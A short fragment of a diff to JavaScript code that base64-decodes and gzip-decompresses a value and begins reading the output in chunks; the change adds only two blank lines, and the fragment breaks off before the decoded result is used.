@@ -10,6 +10,8 @@ return;
 
 const binaryString = atob(code.code);
 const bytes = new Uint8Array(binaryString.length);
+
+
 for (let i = 0; i < binaryString.length; i++) { bytes[i]=binaryString.charCodeAt(i); } const ds=new
   DecompressionStream("gzip"); const stream=new Response(bytes).body.pipeThrough(ds); const reader=stream.getReader();
   let result="" ; function processChunks() { return reader.read().then(({ done, value })=> {
